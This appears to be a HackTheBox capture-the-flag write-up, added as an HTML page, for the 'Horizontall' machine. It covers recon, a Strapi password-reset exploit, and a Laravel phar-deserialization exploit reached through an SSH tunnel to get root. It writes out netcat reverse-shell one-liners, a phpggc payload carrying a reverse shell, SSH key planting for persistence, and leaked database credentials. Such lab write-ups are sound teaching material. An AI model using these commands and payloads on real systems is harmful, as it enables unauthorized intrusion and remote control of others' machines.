@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-02-05 Sat 19:58 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB | Horizontall</title>
+<meta name="generator" content="Org mode">
+<link rel="stylesheet" type="text/css" href="static/style.css" />
+<script type="text/javascript">
+// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
+<!--/*--><![CDATA[/*><!--*/
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+    /*]]>*///-->
+// @license-end
+</script>
+</head>
+<body>
+<div id="preamble" class="status">
+<div class="header">
+    <a href="index.html">Home</a>
+    <a href="https://github.com/c3lphie">Github</a>
+</div>
+</div>
+<div id="content">
+<header>
+<h1 class="title">HTB | Horizontall</h1>
+</header><nav id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgd94b1eb">1. Introduction</a></li>
+<li><a href="#org67848b9">2. Recon</a>
+<ul>
+<li><a href="#org6714c20">2.1. Nmap</a></li>
+<li><a href="#org7c8150d">2.2. Web enumeration</a>
+<ul>
+<li><a href="#org2b5a2ae">2.2.1. Gobuster</a></li>
+<li><a href="#orgd66c521">2.2.2. Zaproxy</a></li>
+<li><a href="#org5c4f8bc">2.2.3. App.js</a></li>
+<li><a href="#orgedd5728">2.2.4. api-prod.horizontall.htb</a>
+<ul>
+<li><a href="#orgca3e870">2.2.4.1. Gobuster</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#orgaf08a4d">3. Exploitation</a>
+<ul>
+<li><a href="#orgead81e2">3.1. Get user</a></li>
+<li><a href="#orgcb50975">3.2. Priv esc</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<div id="outline-container-orgd94b1eb" class="outline-2">
+<h2 id="orgd94b1eb"><span class="section-number-2">1</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Hello and welcome to my write-up for Horizontall.
+This was an easy box with a webserver running on port 80.
+I do a couple of tricks like ssh tunneling, to exploit a service running locally on the machine.
+But with that said, let's get hacking!
+</p>
+</div>
+</div>
+<div id="outline-container-org67848b9" class="outline-2">
+<h2 id="org67848b9"><span class="section-number-2">2</span> Recon</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+First things first, we'll run <code>nmap</code> to get a better image of the services running on the box.
+After this we can do some web enumeration on the web server running on port 80.
+</p>
+</div>
+
+<div id="outline-container-org6714c20" class="outline-3">
+<h3 id="org6714c20"><span class="section-number-3">2.1</span> Nmap</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+I split the scan up into two parts, as I initially wanted to go kinda stealthy on the machine.
+This however went pretty quickly out the window.
+</p>
+<pre class="example" id="org3682ab1">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ nmap -p- 10.129.204.161 -oA nmap/syn_scan_all_ports                                          17:36
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-29 17:36 CEST
+Nmap scan report for 10.129.204.161
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
+
+</pre>
+<p>
+After getting the open ports, I did a version scan and ran the default <code>nmap</code> scripts.
+</p>
+<pre class="example" id="orga185eb7">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ sudo nmap -sC -sV -p 22,80 -O -oA nmap/script_version 10.129.204.161                         17:38
+[sudo] password for c3lphie:
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-29 17:39 CEST
+Nmap scan report for 10.129.204.161
+Host is up (0.030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
+</pre>
+<p>
+Here we get a hostname <code>horizontall.htb</code>, and the version of the web server.
+<code>nginx 1.14.0</code> which is a reverse proxy, this could mean that there might be more running on the server than first thought.
+</p>
+</div>
+</div>
+<div id="outline-container-org7c8150d" class="outline-3">
+<h3 id="org7c8150d"><span class="section-number-3">2.2</span> Web enumeration</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Let's add the hostname to <code>/etc/hosts</code>, before we start exploring the website.
+</p>
+<pre class="example" id="org7f2358d">
+[root@c3lphie-laptop horizontall]# echo "10.129.204.161    horizontall.htb" &gt;&gt; /etc/hosts
+</pre>
+</div>
+<div id="outline-container-org2b5a2ae" class="outline-4">
+<h4 id="org2b5a2ae"><span class="section-number-4">2.2.1</span> Gobuster</h4>
+<div class="outline-text-4" id="text-2-2-1">
+<p>
+Before actually looking at the site, I started <code>gobuster</code>:
+</p>
+<pre class="example" id="orge6e3a5d">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ gobuster dir -u "http://horizontall.htb" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://horizontall.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/c3lphie/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/29 17:51:08 Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/js/]
+/css                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/css/]
+/img                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/img/]
+/.                    (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/./]
+                                                                                 [[3~
+===============================================================
+2021/08/29 17:53:17 Finished
+===============================================================
+</pre>
+<p>
+But as you can see from the output there isn't a lot to come after&#x2026;
+</p>
+</div>
+</div>
+<div id="outline-container-orgd66c521" class="outline-4">
+<h4 id="orgd66c521"><span class="section-number-4">2.2.2</span> Zaproxy</h4>
+<div class="outline-text-4" id="text-2-2-2">
+<p>
+I used <code>zaproxy</code>'s HUD, which is firefox with some extra stuff for attacking web apps.
+The site index, it is a pretty simple website for some new tech-startup.
+</p>
+
+<figure id="org29e96a7">
+<img src="assets/2021-08-29_17-58-08_screenshot.png" alt="2021-08-29_17-58-08_screenshot.png">
+
+</figure>
+
+<p>
+There is even a contact form that doesn't work.
+</p>
+
+<figure id="org20e57b6">
+<img src="assets/2021-08-29_17-58-57_screenshot.png" alt="2021-08-29_17-58-57_screenshot.png">
+
+</figure>
+
+<p>
+It has been created in <code>vue.js</code>, but googling around for vulnerabilties won't give us much unfortunately.
+</p>
+
+<figure id="org38c1e7e">
+<img src="assets/2021-08-29_18-12-54_screenshot.png" alt="2021-08-29_18-12-54_screenshot.png">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-org5c4f8bc" class="outline-4">
+<h4 id="org5c4f8bc"><span class="section-number-4">2.2.3</span> App.js</h4>
+<div class="outline-text-4" id="text-2-2-3">
+<p>
+There is a subdomain leaked in the file <code>app.js</code>:
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Subdomain leak in <code>app.js</code></label><pre class="src src-js">y = {
+    name: "App",
+    components: {
+	Navbar: v,
+	Home: w
+    },
+    data: function() {
+	return {
+	    reviews: []
+	}
+    },
+    methods: {
+	getReviews: function() {
+	    var t = this;
+	    r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
+		return t.reviews = s.data
+	    }))
+	}
+    }
+},
+</pre>
+</div>
+<p>
+Let's add this to <code>/etc/hosts</code>, and start poking a bit on that.
+</p>
+</div>
+</div>
+<div id="outline-container-orgedd5728" class="outline-4">
+<h4 id="orgedd5728"><span class="section-number-4">2.2.4</span> api-prod.horizontall.htb</h4>
+<div class="outline-text-4" id="text-2-2-4">
+</div>
+<div id="outline-container-orgca3e870" class="outline-5">
+<h5 id="orgca3e870"><span class="section-number-5">2.2.4.1</span> Gobuster</h5>
+<div class="outline-text-5" id="text-2-2-4-1">
+<p>
+Why don't we start off with <code>gobuster</code> on the new subdomain:
+</p>
+<pre class="example" id="org63bd168">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ gobuster dir -u "http://api-prod.horizontall.htb/" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api-prod.horizontall.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/c3lphie/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/29 19:13:40 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 200) [Size: 854]
+/Admin                (Status: 200) [Size: 854]
+/users                (Status: 403) [Size: 60]
+/reviews              (Status: 200) [Size: 507]
+/.                    (Status: 200) [Size: 413]
+/ADMIN                (Status: 200) [Size: 854]
+/Users                (Status: 403) [Size: 60]
+/Reviews              (Status: 200) [Size: 507]
+
+===============================================================
+2021/08/29 19:16:05 Finished
+===============================================================
+
+</pre>
+<p>
+Looks like we got some admin site, this could very well be our way in!
+</p>
+
+<p>
+If we look at the headers in the HTTP response:
+</p>
+<pre class="example" id="org35ce3a7">
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sun, 29 Aug 2021 17:15:54 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 413
+Connection: keep-alive
+Vary: Origin
+Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
+Cache-Control: max-age=60
+X-Powered-By: Strapi &lt;strapi.io&gt;
+
+</pre>
+<p>
+We can see that this is running <code>Strapi</code>.
+Inorder to get the version of Strapi, go to following endpoint:
+</p>
+<pre class="example">
+/admin/init
+</pre>
+
+<p>
+This responds with the following JSON:
+</p>
+<pre class="example" id="orga84c231">
+{
+  "data": {
+    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
+    "currentEnvironment": "development",
+    "autoReload": false,
+    "strapiVersion": "3.0.0-beta.17.4"
+  }
+}
+</pre>
+<p>
+If we duckduckgo this version with exploit, we should find the following link: <a href="https://www.exploit-db.com/exploits/50239">https://www.exploit-db.com/exploits/50239</a>
+</p>
+
+<p>
+This python script should give us foothold and user flag!
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgaf08a4d" class="outline-2">
+<h2 id="orgaf08a4d"><span class="section-number-2">3</span> Exploitation</h2>
+<div class="outline-text-2" id="text-3">
+</div>
+<div id="outline-container-orgead81e2" class="outline-3">
+<h3 id="orgead81e2"><span class="section-number-3">3.1</span> Get user</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+Let's run the exploit script:
+</p>
+<pre class="example" id="org8524c1e">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ /usr/bin/python script.py "http://api-prod.horizontall.htb"
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxODQzNTQyLCJleHAiOjE2NDQ0MzU1NDJ9.QJOyBAyGH8OBqNekQ4nm4XnUQ7pb_QHBFdY5GuhdGSc
+
+
+$&gt; 
+</pre>
+<p>
+And we got a shell!
+This shell was rather unstable so I opted for this reverse shell curtesy of <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:
+</p>
+<pre class="example" id="orgb789452">
+$&gt; rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.47 4444 &gt;/tmp/f
+</pre>
+
+<p>
+And now we got proper access:
+</p>
+<pre class="example" id="org08e9fe0">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ nc -lnvp 4444
+Connection from 10.129.176.172:41956
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+strapi
+$ 
+</pre>
+
+<p>
+So let's go find our first flag!
+</p>
+<pre class="example" id="org756a84c">
+$ cd home
+$ ls
+developer
+$ cd developer
+$ ls
+composer-setup.php
+myproject
+user.txt
+$ cat user.txt
+3018████████████████████████████
+</pre>
+
+<p>
+Looking around there are creds for the database in the <code>database.json</code> file in strapi's config folder.
+</p>
+<pre class="example" id="orgff9f86f">
+$ cat database.json
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+</pre>
+<p>
+But this didn't give anything useful for escalating our privileges&#x2026;
+</p>
+
+<p>
+It was about this time I remembered this little trick for upgrading you're shell:
+</p>
+<pre class="example">
+python -c 'import pty;pty.spawn("/bin/bash")'
+</pre>
+
+
+<p>
+Now we are ready to root!
+</p>
+</div>
+</div>
+<div id="outline-container-orgcb50975" class="outline-3">
+<h3 id="orgcb50975"><span class="section-number-3">3.2</span> Priv esc</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+I wanted to run <code>linPEAS.sh</code> on the box, so I created a quick python web server and downloaded the script from there.
+</p>
+
+<p>
+In <code>linPEAS.sh</code> output, there is something interesting under the active ports section:
+</p>
+<pre class="example" id="orgdc0ac64">
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1779/node /usr/bin/
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 10.129.176.172:41986    10.10.17.47:4444        ESTABLISHED 22039/nc
+tcp        0      0 127.0.0.1:54426         127.0.0.1:1337          TIME_WAIT   -
+tcp        0    364 10.129.176.172:42832    10.10.17.47:1337        ESTABLISHED 22071/nc
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 10.129.176.172:35984    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:45356    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:50554    1.1.1.1:53              ESTABLISHED 22026/node
+udp        0      0 10.129.176.172:44466    1.1.1.1:53              ESTABLISHED -
+udp        0      0 10.129.176.172:60232    1.1.1.1:53              ESTABLISHED 24170/node
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+udp        0      0 10.129.176.172:52307    1.1.1.1:53              ESTABLISHED 21997/node
+</pre>
+<p>
+There is in-fact a laravel service running on port 8000.
+</p>
+
+<p>
+I used <code>curl</code> to findout the version number, didn't get a copy of the output&#x2026;
+It did however reveal that it is version 8 with PHP version 7.4.18
+</p>
+<pre class="example">
+Laravel v8 (PHP v7.4.18)
+</pre>
+
+
+<p>
+Searching around a bit led me to this github repository:
+<a href="https://github.com/ambionics/laravel-exploits">https://github.com/ambionics/laravel-exploits</a>
+</p>
+
+<p>
+But instead of uploading and running it on the machine I decided to create a tunnel using SSH.
+I should preface this by saying this part is completly by memory because I forgot to write it down&#x2026;
+</p>
+
+<p>
+I created an ssh key using:
+</p>
+<pre class="example" id="orgefe6fdb">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall ]
+└─&gt; $ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/c3lphie/.ssh/id_rsa): ./id_rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./id_rsa
+Your public key has been saved in ./id_rsa.pub
+The key fingerprint is:
+SHA256:1TbsjKA+ZD2qnrItY1n9eXOhmtKqWBkxI/KIxSfH4KQ c3lphie@c3lphie-laptop
+The key's randomart image is:
++---[RSA 3072]----+
+|  o              |
+| = o       o     |
+|E * B   . . =    |
+|.= = + o o = .   |
+|o . ..+ S . o    |
+|    .*.. .  .    |
+|   oo +o . . .   |
+|  *+ o..+.+ .    |
+| .o**..ooo o     |
++----[SHA256]-----+
+</pre>
+
+<p>
+Then using the same webserver, as for <code>linPEAS.sh</code>, I uploaded <code>id_rsa.pub</code>.
+Created the <code>~/.ssh/</code> folder in <code>strapi</code>'s home folder, and ran:
+</p>
+<pre class="example">
+cat id_rsa.pub &gt; .ssh/authrized_keys
+</pre>
+
+
+<p>
+Now we can setup an ssh tunnel to the laravel service with the following command:
+</p>
+<pre class="example">
+ssh -L 8000:127.0.0.1:8000 -i id_rsa strapi@horizontall.htb
+</pre>
+
+
+<p>
+I then tested to see if the exploit worked, this is done by generating the payload with:
+</p>
+<pre class="example">
+php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
+</pre>
+
+
+<p>
+Which when run with the exploit gives us this output:
+</p>
+<pre class="example" id="org1ce06ab">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/horizontall/www ]
+└─&gt; $ /usr/bin/python laravel.py http://127.0.0.1:8000 /tmp/exploit.phar
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------
++ Logs cleared
+</pre>
+<p>
+And we have root!
+Now all we need to do is create a reverse shell!
+</p>
+<pre class="example">
+php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.47 1337&gt;/tmp/f"
+</pre>
+
+
+<p>
+Set up a nc listener:
+</p>
+<pre class="example">
+nc -lnvp 1337
+</pre>
+
+
+<p>
+And then run the exploit and get the flag:
+</p>
+<pre class="example" id="org13eec08">
+Connection from 10.129.176.172:43028
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+favicon.ico
+index.php
+robots.txt
+web.config
+# cd
+# ls
+boot.sh
+pid
+restart.sh
+root.txt
+# cat root.txt
+1588████████████████████████████
+#
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<div class="footer">
+    <div id="copyright">
+        <small>&copy; Copyright 2021, C3lphie</small>
+    </div>
+</div>
+</div>
+</body>
+</html>
